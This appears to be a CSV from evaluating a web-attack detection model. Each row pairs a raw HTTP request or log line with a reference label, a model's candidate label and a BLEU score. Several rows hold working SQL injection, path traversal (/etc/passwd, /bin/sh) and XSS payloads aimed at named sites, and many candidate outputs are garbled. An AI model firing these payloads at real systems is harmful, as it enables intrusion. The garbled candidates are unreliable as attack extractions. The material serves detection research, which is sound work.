payload,reference_text,candidate_text,bleu_score
"GET / notice / Notice / notice _ view /? f _ content _ num = 382 & search _ key = %'UNION ALL SELECT 80, 80, 80, 80, CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 112 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 103 ) | | CHR ( 120 ) | | CHR ( 120 ) | | CHR ( 84 ) | | CHR ( 69 ) | | CHR ( 82 ) | | CHR ( 85 ) | | CHR ( 105 ) | | CHR ( 86 ) | | CHR ( 85 ) | | CHR ( 88 ) | | CHR ( 115 ) | | CHR ( 83 ) | | CHR ( 102 ) | | CHR ( 122 ) | | CHR ( 68 ) | | CHR ( 84 ) | | CHR ( 71 ) | | CHR ( 108 ) | | CHR ( 113 ) | | CHR ( 119 ) | | CHR ( 86 ) | | CHR ( 116 ) | | CHR ( 84 ) | | CHR ( 85 ) | | CHR ( 85 ) | | CHR ( 70 ) | | CHR ( 74 ) | | CHR ( 113 ) | | CHR ( 97 ) | | CHR ( 75 ) | | CHR ( 110 ) | | CHR ( 116 ) | | CHR ( 122 ) | | CHR ( 73 ) | | CHR ( 73 ) | | CHR ( 118 ) | | CHR ( 118 ) | | CHR ( 69 ) | | CHR ( 72 ) | | CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 118 ) | | CHR ( 120 ) | | CHR ( 113 ), 80, 80, 80, 80, 80, 80, 80 FROM DUAL - - - & search _ val = & per _ page = HTTP / 1. 1 \ r \ nAccept - Language : en - us, en ; q = 0. 5 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : isrc. or. kr \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nUser - Agent : Mozilla / 5. 0 ( X11 ; U ; Linux i686 ; en - US ) AppleWebKit / 533. 3 ( KHTML, like Gecko ) Chrome / 5. 0. 358. 0 Safari / 533. 3 \ r \ nAccept - Chars","Label : 1 Attack Syntax : UNION ALL SELECT 80, 80, 80, 80, CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 112 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 103 ) | | CHR ( 120 ) | | CHR ( 120 ) | | CHR ( 84 ) | | CHR ( 69 ) | | CHR ( 82 ) | | CHR ( 85 ) | | CHR ( 105 ) | | CHR ( 86 ) | | CHR ( 85 ) | | CHR ( 88 ) | | CHR ( 115 ) | | CHR ( 83 ) | | CHR ( 102 ) | | CHR ( 122 ) | | CHR ( 68 ) | | CHR ( 84 ) | | CHR ( 71 ) | | CHR ( 108 ) | | CHR ( 113 ) | | CHR ( 119 ) | | CHR ( 86 ) | | CHR ( 116 ) | | CHR ( 84 ) | | CHR ( 85 ) | | CHR ( 85 ) | | CHR ( 70 ) | | CHR ( 74 ) | | CHR ( 113 ) | | CHR ( 97 ) | | CHR ( 75 ) | | CHR ( 110 ) | | CHR ( 116 ) | | CHR ( 122 ) | | CHR ( 73 ) | | CHR ( 73 ) | | CHR ( 118 ) | | CHR ( 118 ) | | CHR ( 69 ) | | CHR ( 72 ) | | CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 118 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 103 ) | | CHR ( 120 ) | | CHR ( 120 ) | | CHR ( 80 ) | | CHR ( 80 ) | | CHR ( 80 ) | | CHR ( 80 ) | | CHR ( 80 ) | | CHR ( 80 ) | | CHR ( 80 ) | | 80, 80, 80, 80, 80, 80, 80, 80 FROM DUAL - - Attack Type : SQL Injection","Label : 1 Attack Syntax : - ALL UNION 80 80 80 , 80 80 80 , 80 , 80 CHR CHR ( | | | | | | | | | | | | | | CHR ( ( ) | | CHR ( 113 ) | | CHR ( | ) | | CHR ( ) ) | | CHR ( ) ) | | CHR ( ) ) | | CHR ( | ) | | CHR ( | ) | | CHR ( ( ) | | CHR ( ) ) | | CHR ( | ) | | CHR ( | ) | | CHR ( ) ) | | | ( | ) | | CHR ( | ) | | CHR ( ( ) | | CHR ( ( ) | | CHR ( ) ) | | CHR ( ( ) | | CHR ( | ) | | CHR ( ) ) | | | ( ) ) | | CHR ( | ) | | CHR ( | ) | | CHR ( | ) | | CHR ( | ) | | | ( | ) | | CHR ( ( ) | | CHR ( | ) | | CHR ( ( ) | | CHR ( | ) | | CHR ( | ) | | CHR ( ) ) | | CHR ( ) ) | | CHR ( ( ) | | CHR ( ( ) | | CHR ( ( ) | | CHR ( | ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ) | | CHR ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | |",0.3938853304400407
IP _ 2017. 05. 04 address 112. 175. 246. 82 / 32! security zone untrust ip group 112. 175. 248. 64 address 112. 175. 248. 64 / 32! security zone untrust ip group 112. 175. 42. 113 address 112. 175. 42. 113 / 32! security zone untrust ip group 112. 175. 42. 90 label UCSC IP address 112. 175. 42. 90 / 32! security zone untrust ip group 112. 175. 50. 212 label UCSC IP _ 2018. 05. 03 address 112. 175. 50. 212 / 32! security zone untrust ip group 112. 175. 85. 236 label UCSC IP _ 2017. 05. 02 address 112. 175. 85. 236 / 32! security zone untrust ip group 112. 175. 85. 243 label UCSCIP _ 2023. 01. 11 address 112. 175. 85. 243 / 32! security zone untrust ip group 112. 175. 92. 57 label UCSCIP _ 2019. 11. 01 address 112. 175. 92. 57 / 32! security zone untrust ip group 112. 185. 16. 117 label UCSCIP _ 2018. 04. 14 address 112. 185. 16. 117 / 32! security zone untrust ip group 112. 185. 70. 249 label UCSCIP _ 2018. 04. 14 address 112. 185. 70. 249 / 32! security zone untrust ip group 112. 186. 166. 111 _ E label Appended as member of DDoS _ IP address 112. 186. 166. 111 / 32! security zone untrust ip group 112. 186. 17. 231 label UCSC IP _ 2020. 12. 16 address 112. 186. 17. 231 / 32! security zone untrust ip group 112. 187. 100. 10 label UCSC IP _ 2020. 07. 11 address 112. 187. 100. 10 / 32! security zone untrust ip group 112. 192. 197. 101 label UCSC IP _ 2021. 04. 28,Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / css / home / kor / user / editor. css HTTP / 1. 1 Host : www. koreahana. or. kr Connection : keep - alive Pragma : no - cache Cache - Control : no - cache accept - language : zh - CN, zh ; q = 0. 9 User - Agent : Mozilla / 5. 0 ( iPhone ; CPU iPhone OS 11 _ 0 like Mac OS X ) AppleWebKit / 604. 1. 34 ( KHTML, like Gecko ) Version / 11. 0 Mobile / 15A5341f Safari / 604. 1 Accept : text / css, * / * ; q = 0. 1 Sec - Fetch - Site : same - origin Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : style Cookie : JSESSIONID = EEFA66DCE3BECD8D8B248D9A4F163420",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / s / notosanskr / v27 / PbykFmXiEBPT4ITbgNA5Cgm20xz64px _ 1hVWr0wuPNGmlQNMEfD4. 119. woff2 HTTP / 1. 1 Host : fonts. gstatic. com Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" Origin : https : / / atlm. kr sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : * / * X - Client - Data : CMCDywE = Sec - Fetch - Site : cross - site Sec - Fetch - Mode : cors Sec - Fetch - Dest : font Referer : https : / / fonts. googleapis. com / Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"eckread > client ip [ 1. 249. 100. 58 ] [ rcptuid : 25926 ] [ emailid : kang000311 @ naver. com ] [ mailuid : 144592 ] [ subject : ] WARN, 2020. 08. 04 10 : 29 : 41, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / cgi - bin / p2p. cgi ] in DispatcherServlet with name'servlet'INFO, 2020. 08. 04 10 : 29 : 42, FileDownload. bigfileDownload : 186, BigFileDownload [ REMOTE IP : 1. 249. 100. 58 ] [ PARAM : MU9qV0hHL0FOS3ZpeVh2VkZCcXJ2RzQ2aEpobEtkWVFwSXFUOGNDQ1RvQT0 = ] [ FILEUID : 137810 ] [ USERUID : 2606 ] [ FILESIZE : 15872 ] [ FILENAME :. hwp ) ] [ DOWNLOAD : COMPLETE ] WARN, 2020. 08. 04 10 : 29 : 42, PageNotFound. handleHttpRequestMethodNotSupported : 194, Request method'GET'not supported WARN, 2020. 08. 04 10 : 29 : 44, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / current _ config / passwd ] in DispatcherServlet with name'servlet'WARN, 2020. 08. 04 10 : 29 : 51, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / cgi - bin / webproc ] in DispatcherServlet with name'servlet'WARN, 2020. 08. 04 10 : 29 : 55, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / webaccess / index. php ] in DispatcherServlet with name'servlet'WARN, 2020. 08. 04 10 : 29 : 58, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / HNAP1 / ] in DispatcherServlet with name'servlet'WARN, 2020. 08. 04 10 : 30 : 01, PageNotFound.",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"_ scode = C1203020000 AND ( SELECT 9288 FROM ( SELECT COUNT ( * ), CONCAT ( 0x717a786271, ( SELECT ( ELT ( 9288 = 9288, 1 ) ) ), 0x71627a6a71, FLOOR ( RAND ( 0 ) * 2 ) ) x FROM INFORMATION _ SCHEMA. CHARACTER _ SETS GROUP BY x ) a )","Label : 1 Attack Syntax : _ scode = C1203020000 AND ( SELECT 9288 FROM ( SELECT COUNT ( * ), CONCAT ( 0x717a786271, ( SELECT ( ELT ( 9288 = 9288, 1 ) ) ), 0x71627a6a71, FLOOR ( RAND ( 0 ) * 2 ) ) x FROM INFORMATION _ SCHEMA. CHARACTER _ SETS GROUP BY x ) a ) Attack Type : SQL Injection","Label : 1 Attack Syntax : ( ( ( ( ( ( SELECT ( ( ( ( ( ( ( CONCAT ) ) , ( ( ( ( ( ELT RAND RAND RAND 1 , 1 ) ) ) 0 0 0 ( ( ( ( 0 ) ) ) ) ) x x ) . _ ( _ a ) ) ) ) ) ) ) ) ) Type Type",0.15382394221687878
"GET / mcop / pims / view. do? intcNo = 118F403006 & amp ; recptSt =') AND 3623 = 8790 AND ('yogB'='yogB HTTP / 1. 1 \ nCache - Control : no - cache \ nUser - Agent : Opera / 9. 02 ( Windows NT 5. 0 ; U ; sv ) \ nReferer : http : / / m. home. kocca. kr : 80 / mcop / pims / view. do \ nHost : m. home. kocca. kr \ nCookie : KCSESSIONID = 5Ls2gl1V5TCQW0pM2Q1fmQXbRfGzLFp3QQv63D381pq0pxN9BKG7! - 337396942! 791589242 \ nAccept : * / * \ nAccept - Encoding : gzip, deflate \ nConnection : close",Label : 1 Attack Syntax : & amp ; recptSt =') AND 3623 = 8790 AND ('yogB'='yogB Attack Type : SQL Injection,Label : 1 Attack Syntax : intcNo = 118F403006 & recptSt = = AND = = = = = = ' ) ' Attack Type Type Type SQL Injection Injection,0.20563241139732097
"GET / collections / AjaxHCollectionsList. do? langCd = 3 & menuId = & pageIndex = & searchChNm =.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd & searchCollectDt = & searchEnNm = & searchFieldGb = & searchHGubun = Y & searchProd = & searchText = & searchWebGubun = Y HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . / . . / . . / . . / . / / Attack Type : Path Traversal,0.189902924205034
"GET / static / newsstand / 2020 / logo / light / 0604 / 802. png HTTP / 1. 1 Host : s. pstatic. net Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Microsoft Edge "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 Edg / 114. 0. 1823. 41 sec - ch - ua - platform : "" Windows "" Accept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / www. naver. com / Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8 If - Modified - Since : Thu, 04 Jun 2020 07 : 19 : 26 GMT",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"/ mail / list _ async. json HTTP / 1. 1 Origin : http : / / mail. mou. go. kr Referer : http : / / mail. mou. go. kr / mail? locale = ko User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 70. 0. 3538. 102 Safari / 537. 36 Edge / 18. 18362 Accept : * / * Accept - Language : ko Content - Type : application / x - www - form - urlencoded Powered - By : Crinity Accept - Encoding : gzip, deflate Host : mail. mou. go. kr Content - Length : 176 Connection : Keep - Alive Cache - Control : no - cache Cookie : SCOUTER = z5d57g9td3qisq ; locale = ko ; crinity. ssoKey = ddf3d19f - 7bc5 - 4e3d - b9f5 - 790e5c8adbd3 ; JSESSIONID = r4za3NYYbnT0R8Lg9SCaJN5nFLb6aaJkAj68E32a. mailnode1",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / files / abook /. ( 3 ) 8765. jpg HTTP / 1. 1 Host : www. ifes - ras. ru Connection : keep - alive sec - ch - ua : "" Not / A ) Brand "" ; v = "" 99 "", "" Microsoft Edge "" ; v = "" 115 "", "" Chromium "" ; v = "" 115 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 115. 0. 0. 0 Safari / 537. 36 Edg / 115. 0. 1901. 188 sec - ch - ua - platform : "" Windows "" Accept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : same - origin Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / www. ifes - ras. ru / ru - RU Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8, ru ; q = 0. 7",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / swf / ; < img <! - - - - > src = x onerror = alert ( 9268 ) ; / / > <! - - - - > HTTP / 1. 1 \ nReferer : http : / / www. mmca. go. kr / \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ nAccept - Encoding : gzip, deflate \ nHost : www. mmca. go. kr \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ nConnection : Keep - alive",Label : 1 Attack Syntax : < img <! - - - - > src = x onerror = alert ( 9268 ) ; / / > <! - - - - > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < ! < ! ! - - > > src = = alert ( alert ; / ; / > > > : - - - - > Attack Attack : Cross - - Scripting Scripting XSS,0.3804661670910237
"http : / / - ip - : - port - / dvwa / instructions. php / * * / AND / * * / EXTRACTVALUE ( 6453, CONCAT ( 0x5c, 0x717a6a6a71, ( SELECT / * * / ( ELT ( 6453 = 6453, 1 ) ) ), 0x716b786271 ) ) # / * * / BOFx / dvwa / instructions. php? doc = 1 sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,","Label : 1 Attack Syntax : AND / AND / EXTRACTVALUE ( 6453, CONCAT ( 0x5c, 0x717a6a6a71, ( SELECT / ( ELT ( 6453 = 6453, 1 ) ) ), 0x716b786271 ) ) # Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / * * / AND / * * / ( , , , 0x5c , 0x717a6a6a71 , ( ,",0.1552357389121268
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = 9a72ea11076e610ae2a94ff33042a0e2 _ 24492 & sid = fee1700879787095683b4ff33042a0e2 _ 24492 & guuid = 9a72ea11076e610ae2a94ff33042a0e2 _ 24492 & expired = 1617726433 & dr = http : / / www. kocis. go. kr / eng / openWebzine. do? langCode = lang002 & regCode = & cateCode = & searchText = & searchType = & startDate = & endDate = & page = 4 & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openWebzine. do? langCode = lang002 & regCode = & cateCode = & searchText = & searchType = & startDate = & endDate = & page = 5 & js = Y & sr = 1353x846 & scd = 24 & je = N & tz = 2 & tye = 2021 & tmo = 4 & tda = 6 & tho = 17 & tmi = 57 & tse = 13 & lng = hu - HU & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 & ck = Y & brsz = 1353x747 & isnw = N HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 \ r \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / www. kocis. go. kr / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : hu - HU, hu ; q = 0. 9, en",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / server / node _ upgrade _ srv. js? action = downloadFirmware & firmware = /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd HTTP / 1. 1Host : koreamet. kopri. re. krUser - Agent : Mozilla / 5. 0 ( Windows NT 6. 1 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 41. 0. 2228. 0 Safari / 537. 36Connection : closeAccept : * / * Accept - Language : enAccept - Encoding : gzip",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / etc / passwd Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . / . . / . . / . . / etc / / . Type : Path Traversal,0.1820057458455135
"GET / oceangrid / cmm / proxyRun. do? call = wms & LAYERS = geotwo _ postgis : og _ rcm _ gm _ mdc _ view & CQL _ FILTER = cre _ year > = 2012 AND cre _ year < = 2020 AND date _ type ='hours'& SERVICE = WMS & REQUEST = GetMap & FORMAT = image / png & VERSION = 1. 3. 0 & EXCEPTIONS = text / xml & TRANSPARENT = TRUE & STYLES = & CRS = EPSG : 900913 & BBOX = 13980649. 265247, 4199434. 8008529, 14127408. 359535, 4270444. 8001199 & WIDTH = 1920 & HEIGHT = 929 HTTP / 1. 1 PRS - CID : 7983 Host : www. khoa. go. kr Connection : keep - alive User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 102. 0. 5005. 115 Safari / 537. 36 Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Referer : http : / / www. khoa. go. kr / oceangrid / gis / category / observe / observeSearch. do? type = EYS Accept - Encoding : gzip, deflate Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7, ja ; q = 0. 6 Cookie : JSESSIONID = AGSrkDKEctQhFi7TqQSxSvIB17GHgAG1oR6nUCd3nsiHNp2y7bsJKCaPMNXePnM0. UEtIT0Evb2NlYW5ncmlkMTE = ; WMONID = ggLt2fpcErq ; PCID = 2bf47b67 - 2fd3 - 4292 - 73c1 - 4e2345f02673 - 1654923655813 ; SCOUTER = x29atop42rfh5c",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
GET / examplesWebApp / InteractiveQuery. jsp? person = < script > alert ('Vulnerable') < / script > HTTP / 1. 1 Host : 10. 0. 20. 20 Content - Length : 1 Connection : Keep - Alive User - Agent : Mozilla / 5. 00 ( Nikto / 2. 1. 6 ) ( Evasions : None ) ( Test : 003081 ) Content - Type : application / x - www - form - urlencoded ;,Label : 1 Attack Syntax : < script > alert ('Vulnerable') < / script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < script > alert ( ' Vulnerable ' ) < / script > Attack Type : Cross - Site Scripting ( XSS ),0.759907656827929
"http : / / - ip - / dvwa / index. php / dvwa / dvwa / js / dvwaPage. js? txt = < script > alert ( 867 ) < / script > Mozilla / 5. 0 ( Windows NT 6. 1 ; WOW64 ; Trident / 7. 0 ; rv : 11. 0 ) like Gecko security = impossible,",Label : 1 Attack Syntax : < script > alert ( 867 ) < / script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < script > alert ( Type : < / script > > Type : Cross - - Site Scripting XSS ),0.617348329813765
POST / cgi - bin /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / bin / sh HTTP / 1. 1Accept : * / * Connection : keep - aliveHost : 203. 250. 179. 26 : 80Upgrade - Insecure - Requests : 1User - Agent : Custom - HttpClientContent - Type : text / plainContent - Length : 124,Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. / bin / sh Attack Type : Path Traversal,Label : 1 Attack Syntax : GET . / . . / . . / . . / . . / . . / . . / . . / . / / . / / . / / . . / Type Type,0.0902349678619119
"GET / er? v = 2 & navt = 0 : 43 : 43 : 4 : 15 : 15 : 15 : 15 : 15 : 15 : 18 : 36 : 324 : 46 : 397 : 397 : 400 : 440 : 440 : 442 : 0 : 1 & page _ id = i47Q7dp0YidssEBtkvGssssstHd - 429673 & ssc = tab. view. view & tags = conn _ r _ TLSv1. 3 _. : alpn. : wtm : _ ssl : ua. chrome. 114 HTTP / 1. 1 Host : er. search. naver. com Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Microsoft Edge "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 Edg / 114. 0. 1823. 41 sec - ch - ua - platform : "" Windows "" Accept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : same - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / search. naver. com / search. naver? query = & nso = & where = view & sm = tab _ nmr & mode = normal Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8 Cookie : NNB = WT3OWEAEWI2GI ; _ ga = GA1. 2. 391951542. 1681950971 ; ASID = 0e27d8fd00000187a12bcd820000005b ; nx _ ssl = 2 ; _ naver _ usersession _ = LY8 + FJNV3m4Kw5LxvhZSQw = = ; page _ uid = i47Q7dp0YidssEBtkvGssssstHd -",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / board / board _ write? code = & lt ; SCRIPT & gt ; document. write ( & quot ; & lt ; SCRI & quot ; ) ; & lt ; / SCRIPT & gt ; PT + SRC = & quot ; http : / / ha. ckers. org / xss. js & quot ; & gt ; & lt ; / SCRIPT & gt ; HTTP / 1. 1 Host : 10. 0. 20. 20 User - Agent : Mozilla / 5. 0 ( X11 ; Linux i686 ; rv : 60. 0 ) Gecko / 20100101 Firefox / 60. 0 Accept - Encoding : gzip, deflate Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 Connection : close Accept - Language : en - US, en ; q = 0. 5 DNT : 1 Upgrade - Insecure - Requests : 1","Label : 1 Attack Syntax : < SCRIPT > document. write ( "" < SCRIPT > "" ) ; < / SCRIPT > Attack Type : Cross - Site Scripting ( XSS )",Label : 1 Attack Syntax : lt ; ; ; gt ; ; ; ; ; - ( ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; gt & & & & ; ; ; ; ; ;,0.11346446511593337
